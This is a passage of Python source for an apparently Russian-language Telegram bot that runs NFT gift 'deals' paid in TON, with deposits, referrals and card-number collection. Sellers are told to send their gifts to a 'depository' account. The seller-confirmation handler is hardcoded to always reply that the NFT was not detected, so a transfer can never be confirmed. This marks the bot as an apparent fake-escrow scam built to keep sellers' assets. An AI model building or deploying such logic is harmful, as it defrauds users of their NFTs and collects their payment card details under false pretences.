        deal = await fetch_deal(did)
        if not deal:
            return
        dep_id = gen_id()
        async with aiosqlite.connect(DB_PATH) as db:
            await db.execute("INSERT INTO deposits VALUES (?,?,?,'pending',?)",
                             (dep_id, uid, deal[2], datetime.now().isoformat()))
            await db.commit()
        lang       = await get_lang(uid)
        back_label = f"{I_BACK}  Вернуться к сделке" if lang == "ru" else f"{I_BACK}  Back to Deal"
        await edit(
            await t(uid, "topup_ton", amount=deal[2], wallet=TON_WALLET, dep_id=dep_id),
            InlineKeyboardMarkup(inline_keyboard=[[ib(back_label, f"view_{did}")]]),
        )

    elif d.startswith("view_"):
        did  = d[len("view_"):]
        deal = await fetch_deal(did)
        if not deal or deal[6] != "active":
            await edit(await t(uid, "deal_unavail"), await kb_back(uid))
            return
        enough = (await get_balance(uid)) >= deal[2]
        await edit(await deal_view_text(uid, deal), await kb_deal_buyer(uid, did, enough), no_preview=True)

    elif d.startswith("pay_deal_"):
        did  = d[len("pay_deal_"):]
        deal = await fetch_deal(did)
        if not deal or deal[6] != "active":
            await cb.answer(await t(uid, "deal_unavail"), show_alert=True)
            return
        if (await get_balance(uid)) < deal[2]:
            await cb.answer(await t(uid, "insufficient"), show_alert=True)
            return
        user_state[uid] = {"state": S_RECIPIENT, "deal_id": did}
        await edit(await t(uid, "enter_recipient"), await kb_back(uid))

    elif d.startswith("seller_confirm_"):
        lang = await get_lang(uid)
        msg_text = (
            f"{I_CROSS} Передача не подтверждена. NFT-актив не обнаружен на аккаунте-депозитарии. "
            "Убедитесь в корректности передачи и повторите попытку."
            if lang == "ru" else
            f"{I_CROSS} Transfer not confirmed. NFT asset not detected on the depository account. "
            "Ensure the transfer was completed and try again."
        )
        await cb.answer(msg_text, show_alert=True)

    elif d == "referral":
        await edit(await t(uid, "referral", bot=BOT_USERNAME, ref_id=uid), await kb_back(uid), no_preview=True)

    elif d == "language":
        lang       = await get_lang(uid)
        back_label = f"{I_BACK}  Главное меню" if lang == "ru" else f"{I_BACK}  Main Menu"
        await edit(
            await t(uid, "lang_menu"),
            InlineKeyboardMarkup(inline_keyboard=[
                [InlineKeyboardButton(text="🇬🇧  English", callback_data="lang_en")],
                [InlineKeyboardButton(text="🇷🇺  Русский",  callback_data="lang_ru")],
                [ib(back_label, "back")],
            ])
        )

    elif d == "lang_ru":
        await set_field(uid, "language", "ru")
        await edit(TX("ru")["lang_ru_ok"],
                   InlineKeyboardMarkup(inline_keyboard=[[ib(f"{I_BACK}  Главное меню", "back")]]))

    elif d == "lang_en":
        await set_field(uid, "language", "en")
        await edit(TX("en")["lang_en_ok"],
                   InlineKeyboardMarkup(inline_keyboard=[[ib(f"{I_BACK}  Main Menu", "back")]]))

# ── TEXT HANDLER ──────────────────────────────────────────────
@dp.message(F.text)
async def on_text(msg: Message):
    uid   = msg.from_user.id
    text  = msg.text.strip()
    await ensure_user(uid, msg.from_user.username or "")
    st    = user_state.get(uid, {})
    state = st.get("state")

    if state == S_TON:
        if not valid_ton(text):
            await msg.answer(await t(uid, "bad_ton"), reply_markup=await kb_back(uid))
            return
        await set_field(uid, "ton_wallet", text)
        user_state.pop(uid, None)
        await msg.answer(await t(uid, "ton_saved"))
        await send_banner(uid, await t(uid, "welcome"), await kb_main(uid))

    elif state == S_CARD:
        if not valid_card(text):
            await msg.answer(await t(uid, "bad_card"), reply_markup=await kb_back(uid))
            return
        await set_field(uid, "card", text)
        user_state.pop(uid, None)
        await msg.answer(await t(uid, "card_saved"))
        await send_banner(uid, await t(uid, "welcome"), await kb_main(uid))

    elif state == S_AMOUNT:
        try:
            amount = float(text.replace(",", "."))
            if amount <= 0:
                raise ValueError
            user_state[uid]["amount"] = amount
            user_state[uid]["state"]  = S_GIFTS
            await send_banner(uid, await t(uid, "enter_gifts"), await kb_back(uid))
        except ValueError:
            await msg.answer(await t(uid, "bad_amount"), reply_markup=await kb_back(uid))

    elif state == S_GIFTS:
        good = valid_gifts(text)
        if not good:
            await msg.answer(await t(uid, "bad_gifts"), reply_markup=await kb_back(uid))
            return
        did      = gen_id()
        amount   = st.get("amount", 0)
        currency = st.get("currency", "TON")
        method   = st.get("method", "TON")
        await save_deal(did, uid, amount, currency, ",".join(good), method)
        user_state.pop(uid, None)
        await msg.answer(
            await t(uid, "deal_ok", amount=amount, cur=currency,
                    gifts=fmt_gifts(",".join(good)), bot=BOT_USERNAME, did=did),
            reply_markup=await kb_back(uid),
            disable_web_page_preview=True,
        )

    elif state == S_RECIPIENT:
        recipient = valid_recipient(text)
        if not recipient:
            await msg.answer(await t(uid, "bad_recipient"), reply_markup=await kb_back(uid))
            return
        did  = st.get("deal_id")
        deal = await fetch_deal(did) if did else None
        if not deal or deal[6] != "active":
            await msg.answer(await t(uid, "no_deal"), reply_markup=await kb_back(uid))
            user_state.pop(uid, None)
            return
        amount = deal[2]; currency = deal[3]
        if (await get_balance(uid)) < amount:
            await msg.answer(await t(uid, "insufficient"), reply_markup=await kb_back(uid))
            user_state.pop(uid, None)
            return
        await deduct_balance(uid, amount)
        await update_deal(did, status="paid", buyer_id=uid, recipient=recipient)
        user_state.pop(uid, None)
        gifts = fmt_gifts(deal[4])
        await msg.answer(
            await t(uid, "deal_paid_buyer", amount=amount, cur=currency, gifts=gifts),
            reply_markup=await kb_back(uid),
            disable_web_page_preview=True
        )
        try:
            await bot.send_message(
                deal[1],
                await t(deal[1], "deal_paid_seller",
                        did=did, amount=amount, cur=currency,
                        gifts=gifts, safe=SAFE_ACCOUNT),
                reply_markup=kb_seller_confirm(did),
                disable_web_page_preview=True,
            )
        except Exception as ex:
            logger.error(f"Seller notify: {ex}")

    else:
        await send_banner(uid, await t(uid, "welcome"), await kb_main(uid))

# ── MAIN ─────────────────────────────────────────────────────
async def main():
    global BOT_USERNAME
    await init_db()
    info = await bot.get_me()
    BOT_USERNAME = info.username
    logger.info(f"Bot started: @{BOT_USERNAME}")
    asyncio.create_task(ton_checker())
    await dp.start_polling(bot, drop_pending_updates=True)

if __name__ == "__main__":
    asyncio.run(main())
